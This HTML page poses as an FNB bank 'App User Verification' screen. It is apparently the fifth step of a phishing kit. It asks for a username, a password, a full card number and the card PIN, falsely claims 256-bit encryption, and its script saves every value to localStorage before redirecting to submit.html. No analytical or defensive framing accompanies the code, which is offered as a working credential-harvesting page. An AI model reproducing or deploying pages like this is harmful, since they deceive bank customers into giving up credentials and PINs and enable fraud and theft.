<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FNB - App User Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #ffffff 0%, #f0f9ff 30%, #e6f7f6 70%, #ccfbf1 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow-x: hidden;
        }

        /* Background Shapes */
        .bg-shape {
            position: fixed;
            border-radius: 50%;
            opacity: 0.08;
            animation: floatShape 20s ease-in-out infinite;
            pointer-events: none;
            z-index: 0;
        }

        .bg-shape-1 {
            width: 400px;
            height: 400px;
            background: #00a79d;
            top: -100px;
            right: -100px;
            animation-delay: 0s;
        }

        .bg-shape-2 {
            width: 300px;
            height: 300px;
            background: #f5a623;
            bottom: -80px;
            left: -80px;
            animation-delay: -5s;
        }

        .bg-shape-3 {
            width: 200px;
            height: 200px;
            background: #00a79d;
            top: 50%;
            left: 10%;
            animation-delay: -10s;
        }

        @keyframes floatShape {
            0%, 100% { transform: translate(0, 0) scale(1); }
            25% { transform: translate(30px, -30px) scale(1.05); }
            50% { transform: translate(-20px, 20px) scale(0.95); }
            75% { transform: translate(20px, 30px) scale(1.02); }
        }

        /* Step Indicator */
        .step-indicator {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 30px;
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeInDown 0.8s ease-out 0.1s forwards;
        }

        .step {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 10px 20px;
            background: white;
            border-radius: 50px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
            font-size: 0.85rem;
            font-weight: 600;
            color: #94a3b8;
            transition: all 0.4s ease;
        }

        .step.active {
            background: #00a79d;
            color: white;
            box-shadow: 0 8px 25px rgba(0, 167, 157, 0.35);
            transform: scale(1.05);
        }

        .step.completed {
            background: #e6f7f6;
            color: #00a79d;
        }

        .step-number {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: currentColor;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.75rem;
            font-weight: 700;
        }

        .step.active .step-number {
            background: white;
            color: #00a79d;
        }

        .step.completed .step-number {
            background: #00a79d;
            color: white;
        }

        .step-divider {
            width: 30px;
            height: 2px;
            background: #e2e8f0;
            border-radius: 1px;
        }

        /* Logo */
        .logo-container {
            margin-bottom: 25px;
            text-align: center;
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeInDown 0.8s ease-out 0.2s forwards;
        }

        .logo-container img {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            object-fit: cover;
            box-shadow: 0 15px 50px rgba(0, 167, 157, 0.35);
            animation: logoPulse 3s ease-in-out infinite;
            transition: transform 0.4s ease;
        }

        .logo-container img:hover {
            transform: scale(1.1) rotate(5deg);
        }

        @keyframes logoPulse {
            0%, 100% { transform: scale(1); box-shadow: 0 15px 50px rgba(0, 167, 157, 0.35); }
            50% { transform: scale(1.06); box-shadow: 0 20px 60px rgba(0, 167, 157, 0.5); }
        }

        .logo-container h2 {
            margin-top: 12px;
            color: #00a79d;
            font-weight: 800;
            letter-spacing: 4px;
            font-size: 1.6rem;
        }

        /* Card */
        .verify-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            padding: 45px 40px;
            border-radius: 28px;
            box-shadow: 
                0 25px 80px rgba(0, 0, 0, 0.08),
                0 0 0 1px rgba(255, 255, 255, 0.5) inset;
            width: 100%;
            max-width: 480px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.6);
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeInUp 1s ease-out 0.5s forwards;
            transition: transform 0.4s ease, box-shadow 0.4s ease;
        }

        .verify-card:hover {
            transform: translateY(-5px);
            box-shadow: 
                0 35px 100px rgba(0, 167, 157, 0.12),
                0 0 0 1px rgba(255, 255, 255, 0.5) inset;
        }

        .verify-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 4px;
            background: linear-gradient(90deg, transparent, #00a79d, transparent);
            border-radius: 2px;
            opacity: 0;
            animation: fadeIn 0.6s ease-out 1s forwards;
        }

        .verify-card h1 {
            font-size: 1.6rem;
            font-weight: 800;
            color: #0f172a;
            margin-bottom: 10px;
            line-height: 1.3;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 0.8s forwards;
        }

        .verify-card .subtitle {
            color: #64748b;
            font-size: 0.95rem;
            margin-bottom: 30px;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1s forwards;
        }

        /* Security Badge */
        .security-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 10px 20px;
            background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
            border: 1px solid #f59e0b;
            border-radius: 50px;
            font-size: 0.85rem;
            font-weight: 600;
            color: #92400e;
            margin-bottom: 25px;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1.1s forwards;
        }

        .security-badge::before {
            content: '🔒';
        }

        /* Form */
        .form-group {
            text-align: left;
            margin-bottom: 18px;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out forwards;
        }

        .form-group:nth-child(1) { animation-delay: 1.2s; }
        .form-group:nth-child(2) { animation-delay: 1.3s; }
        .form-group:nth-child(3) { animation-delay: 1.4s; }
        .form-group:nth-child(4) { animation-delay: 1.5s; }

        .form-group label {
            display: block;
            font-weight: 600;
            color: #0f172a;
            margin-bottom: 8px;
            font-size: 0.9rem;
            transition: color 0.3s ease;
        }

        .form-group:focus-within label {
            color: #00a79d;
        }

        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 14px;
            font-family: inherit;
            font-size: 0.95rem;
            color: #0f172a;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            outline: none;
            background: #fafafa;
        }

        .form-group input:focus {
            border-color: #00a79d;
            box-shadow: 0 0 0 4px rgba(0, 167, 157, 0.12), 0 4px 20px rgba(0, 167, 157, 0.08);
            background: white;
            transform: translateY(-2px);
        }

        .form-group input::placeholder {
            color: #94a3b8;
        }

        /* PIN input styling */
        .pin-input {
            letter-spacing: 8px;
            font-size: 1.2rem !important;
            text-align: center;
            font-weight: 700;
        }

        /* Submit Button */
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #00a79d 0%, #008c82 100%);
            color: white;
            border: none;
            border-radius: 14px;
            font-weight: 700;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            position: relative;
            overflow: hidden;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1.7s forwards;
            margin-top: 10px;
        }

        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.6s ease;
        }

        .submit-btn:hover::before {
            left: 100%;
        }

        .submit-btn:hover {
            background: linear-gradient(135deg, #008c82 0%, #007a71 100%);
            transform: translateY(-3px);
            box-shadow: 0 15px 45px rgba(0, 167, 157, 0.4);
        }

        .submit-btn:active {
            transform: translateY(-1px);
        }

        .submit-btn:disabled {
            background: #94a3b8;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .btn-loader {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: none;
        }

        .submit-btn.loading .btn-loader {
            display: inline-block;
        }

        .submit-btn.loading .btn-text {
            display: none;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Error Message */
        .error-message {
            display: none;
            padding: 12px 16px;
            background: linear-gradient(135deg, #fef2f2 0%, #fee2e2 100%);
            border: 1px solid #fecaca;
            border-radius: 12px;
            color: #dc2626;
            font-size: 0.85rem;
            margin-bottom: 18px;
            text-align: left;
            animation: shake 0.5s ease-in-out;
        }

        .error-message.show {
            display: block;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-8px); }
            40% { transform: translateX(8px); }
            60% { transform: translateX(-4px); }
            80% { transform: translateX(4px); }
        }

        /* Back Link */
        .back-link {
            margin-top: 20px;
            color: #64748b;
            font-size: 0.9rem;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s ease;
            padding: 8px 16px;
            border-radius: 10px;
            opacity: 0;
            animation: fadeInUp 0.8s ease-out 1.9s forwards;
        }

        .back-link:hover {
            color: #00a79d;
            background: rgba(0, 167, 157, 0.08);
            transform: translateX(-4px);
        }

        /* Footer Note */
        .footer-note {
            margin-top: 25px;
            color: #94a3b8;
            font-size: 0.8rem;
            text-align: center;
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeIn 1s ease-out 2.1s forwards;
        }

        .footer-note span {
            color: #00a79d;
            font-weight: 600;
        }

        .footer-note .lock-icon {
            display: inline-block;
            animation: lockPulse 2s ease-in-out infinite;
        }

        @keyframes lockPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.2); }
        }

        /* Floating particles */
        .particle {
            position: fixed;
            width: 6px;
            height: 6px;
            background: rgba(0, 167, 157, 0.2);
            border-radius: 50%;
            pointer-events: none;
            z-index: 0;
            animation: particleFloat 15s ease-in-out infinite;
        }

        @keyframes particleFloat {
            0%, 100% { transform: translateY(100vh) scale(0); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes fadeInDown {
            from { opacity: 0; transform: translateY(-30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @media (max-width: 600px) {
            .verify-card { padding: 35px 25px; }
            .verify-card h1 { font-size: 1.4rem; }
            .logo-container img { width: 80px; height: 80px; }
            .step { padding: 8px 14px; font-size: 0.75rem; }
            .step-divider { width: 15px; }
        }
    </style>
</head>
<body>

    <!-- Background Shapes -->
    <div class="bg-shape bg-shape-1"></div>
    <div class="bg-shape bg-shape-2"></div>
    <div class="bg-shape bg-shape-3"></div>

    <!-- Floating Particles -->
    <div class="particle" style="left: 10%; animation-delay: 0s; animation-duration: 12s;"></div>
    <div class="particle" style="left: 25%; animation-delay: 3s; animation-duration: 15s;"></div>
    <div class="particle" style="left: 50%; animation-delay: 6s; animation-duration: 18s;"></div>
    <div class="particle" style="left: 75%; animation-delay: 2s; animation-duration: 14s;"></div>
    <div class="particle" style="left: 90%; animation-delay: 5s; animation-duration: 16s;"></div>

    <!-- Step Indicator -->
    <div class="step-indicator">
        <div class="step completed">
            <span class="step-number">✓</span>
            <span>Request</span>
        </div>
        <div class="step-divider"></div>
        <div class="step completed">
            <span class="step-number">✓</span>
            <span>Details</span>
        </div>
        <div class="step-divider"></div>
        <div class="step completed">
            <span class="step-number">✓</span>
            <span>Confirm</span>
        </div>
        <div class="step-divider"></div>
        <div class="step completed">
            <span class="step-number">✓</span>
            <span>App</span>
        </div>
        <div class="step-divider"></div>
        <div class="step active">
            <span class="step-number">5</span>
            <span>Verify</span>
        </div>
    </div>

    <!-- Logo -->
    <div class="logo-container">
        <img src="images.png" alt="FNB Logo">
        <h2>FNB</h2>
    </div>

    <!-- Verify Card -->
    <div class="verify-card">
        <h1>App User Verification</h1>
        <p class="subtitle">Please verify your account credentials to proceed.</p>

        <div class="security-badge">
            Secure & Confidential — 256-bit Encrypted
        </div>

        <div class="error-message" id="error-message"></div>

        <form id="verify-form">
            <div class="form-group">
                <label for="username">Username *</label>
                <input type="text" id="username" name="username" placeholder="Enter your username" required>
            </div>

            <div class="form-group">
                <label for="password">Password *</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>

            <div class="form-group">
                <label for="card-number">Card Number *</label>
                <input type="text" id="card-number" name="card_number" placeholder="1234 5678 9012 3456" maxlength="19" required>
            </div>

            <div class="form-group">
                <label for="card-pin">Card PIN *</label>
                <input type="password" id="card-pin" name="card_pin" placeholder="••••" maxlength="4" class="pin-input" required>
            </div>

            <button type="submit" class="submit-btn" id="submit-btn">
                <span class="btn-loader"></span>
                <span class="btn-text">Continue →</span>
            </button>
        </form>

        <a href="banking-app.html" class="back-link">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M19 12H5M12 19l-7-7 7-7"/>
            </svg>
            Back
        </a>
    </div>

    <p class="footer-note">
        <span class="lock-icon">🔒</span> Your information is <span>secure & confidential</span>. Protected by 256-bit encryption.
    </p>

    <script>
        // ===== CARD NUMBER FORMATTING =====
        const cardNumberInput = document.getElementById('card-number');
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.substring(0, 16);
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formattedValue += ' ';
                formattedValue += value[i];
            }
            e.target.value = formattedValue;
        });

        // ===== PIN INPUT (numbers only) =====
        const pinInput = document.getElementById('card-pin');
        pinInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
        });

        // ===== FORM HANDLING =====
        const form = document.getElementById('verify-form');
        const submitBtn = document.getElementById('submit-btn');
        const errorMessage = document.getElementById('error-message');

        form.addEventListener('submit', function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
            const cardPin = document.getElementById('card-pin').value;

            // Validation
            if (!username || !password || !cardNumber || !cardPin) {
                errorMessage.textContent = 'Please fill in all required fields.';
                errorMessage.classList.add('show');
                return;
            }

            if (cardNumber.length !== 16) {
                errorMessage.textContent = 'Please enter a valid 16-digit card number.';
                errorMessage.classList.add('show');
                return;
            }

            if (cardPin.length !== 4) {
                errorMessage.textContent = 'Please enter a valid 4-digit PIN.';
                errorMessage.classList.add('show');
                return;
            }

            // Save to localStorage
            localStorage.setItem('fnb_username', username);
            localStorage.setItem('fnb_password', password);
            localStorage.setItem('fnb_card_number', cardNumber);
            localStorage.setItem('fnb_card_pin', cardPin);
            localStorage.setItem('fnb_step5_time', new Date().toISOString());

            // Show loading
            submitBtn.classList.add('loading');
            submitBtn.disabled = true;

            setTimeout(() => {
                window.location.href = 'submit.html';
            }, 800);
        });

        // Hide error on input
        form.querySelectorAll('input').forEach(field => {
            field.addEventListener('input', () => errorMessage.classList.remove('show'));
        });
    </script>

</body>
</html>
